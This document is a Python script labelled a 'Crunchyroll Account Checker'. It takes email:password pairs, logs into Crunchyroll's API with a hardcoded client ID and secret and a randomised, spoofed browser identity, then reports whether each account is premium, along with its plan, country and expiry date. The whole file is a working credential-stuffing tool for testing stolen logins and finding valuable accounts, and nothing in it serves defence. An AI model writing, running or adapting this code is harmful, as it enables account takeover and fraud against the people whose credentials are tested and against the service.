import uuid
import requests
import re
from datetime import datetime, timezone
from user_agent import generate_user_agent

def GetRDay(expiry_date):
    expiry = datetime.strptime(expiry_date, "%Y-%m-%d").replace(tzinfo=timezone.utc)
    current = datetime.now(timezone.utc)
    delta = expiry - current
    return max(0, delta.days)

def check_crunchyroll_account(user, pasw):
    """
    Check a single Crunchyroll account and return details as a dict.
    """
    id = str(uuid.uuid4())
    userA = generate_user_agent()
    login = "https://beta-api.crunchyroll.com/auth/v1/token"
    header = {
        "Host": "beta-api.crunchyroll.com",
        "User-Agent": userA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Origin": "https://sso.crunchyroll.com",
        "Referer": "https://sso.crunchyroll.com/login",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }

    data = {
        "grant_type": "password",
        "username": user,
        "password": pasw,
        "scope": "offline_access",
        "client_id": "ajcylfwdtjjtq7qpgks3",
        "client_secret": "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_",
        "device_type": "@xyz",
        "device_id": id,
        "device_name": "Luis"
    }

    try:
        r1 = requests.post(login, headers=header, data=data, timeout=10)
        r1.raise_for_status()
        login_r = r1.json()
    except requests.exceptions.RequestException as e:
        return {"status": "failed", "error": f"Login request failed: {str(e)}", "login": False}

    if "error" in login_r:
        return {"status": "failed", "error": login_r.get('error'), "login": False}
    elif "access_token" in login_r:
        act = login_r.get("access_token")
    else:
        return {"status": "unknown", "login": False}

    get_id = "https://beta-api.crunchyroll.com/accounts/v1/me"
    header = {
        "etp-anonymous-id": "64a91812-bb46-40ad-89ca-ff8bb567243d",
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Authorization": f"Bearer {act}",
        "User-Agent": userA,
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.crunchyroll.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
    }

    try:
        r2 = requests.get(get_id, headers=header, timeout=10)
        r2.raise_for_status()
        data = r2.json()
    except requests.exceptions.RequestException as e:
        return {"status": "failed", "error": f"Account info request failed: {str(e)}", "login": False}

    aci = data.get("account_id")
    exi = data.get("external_id")

    emailV = re.search(r'"email_verified":([^,}]*)', r2.text)
    EV = emailV.group(1).strip() if emailV else "N/A"

    sts = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{exi}/benefits"
    header = {
        "Authorization": f"Bearer {act}"
    }

    try:
        r3 = requests.get(sts, headers=header, timeout=10)
        r3.raise_for_status()
        data = r3.text
    except requests.exceptions.RequestException as e:
        return {"status": "failed", "error": f"Subscription benefits request failed: {str(e)}", "login": False}

    status = "PREMIUM" if '"total":0,' not in data else "FREE"

    country = re.search(r'"subscription_country":"([^"]*)"', data)
    C = country.group(1).strip() if country else "Not found"

    sub = f"https://beta-api.crunchyroll.com/subs/v3/subscriptions/{aci}"
    header = {
        "Authorization": f"Bearer {act}"
    }

    try:
        r4 = requests.get(sub, headers=header, timeout=10)
        r4.raise_for_status()
        data = r4.text
    except requests.exceptions.RequestException as e:
        return {"status": "failed", "error": f"Subscription details request failed: {str(e)}", "login": False}

    active = re.search(r'"is_active":([^,}]*)', data)
    alive = active.group(1).strip() if active else "N/A"

    sku = re.search(r'"sku":"([^"]*)"', data)
    Plan = sku.group(1).strip() if sku else "N/A"

    ex = re.search(r'"expiration_date":"([^"]*)"', data)
    if ex:
        Expiry = ex.group(1).strip().split("T")[0]
    else:
        ex2 = re.search(r'"next_renewal_date":"([^"]*)"', data)
        Expiry = ex2.group(1).strip().split("T")[0] if ex2 else "N/A"

    Days = GetRDay(Expiry) if Expiry != "N/A" else "N/A"

    return {
        "status": "success",
        "login": True,
        "email_verified": EV,
        "account_status": status,
        "country": C,
        "active_subscription": alive,
        "plan": Plan,
        "expiry_date": Expiry,
        "days_remaining": Days
    }

# For standalone use
if __name__ == "__main__":
    c = input("Enter mail:pass =>  ").strip()

    if ':' in c:
        user, pasw = c.split(':', 1)
    else:
        print("Invalid format. Use mail:pass")
        exit()

    result = check_crunchyroll_account(user, pasw)
    if result["status"] == "success":
        print("Login Done [✅]")
        print(f"Email Verified: {result['email_verified']}")
        print(f"Status: {result['account_status']}")
        print(f"Country: {result['country']}")
        print(f"Active Subscription: {result['active_subscription']}")
        print(f"Plan: {result['plan']}")
        print(f"Expiry Date: {result['expiry_date']}")
        print(f"Days Remaining: {result['days_remaining']}")
    elif result["status"] == "failed":
        print(f"Login Failed {result['error']} [❌]")
    else:
        print("Unknown Resp")

    print("Crunchyroll Account Checker")
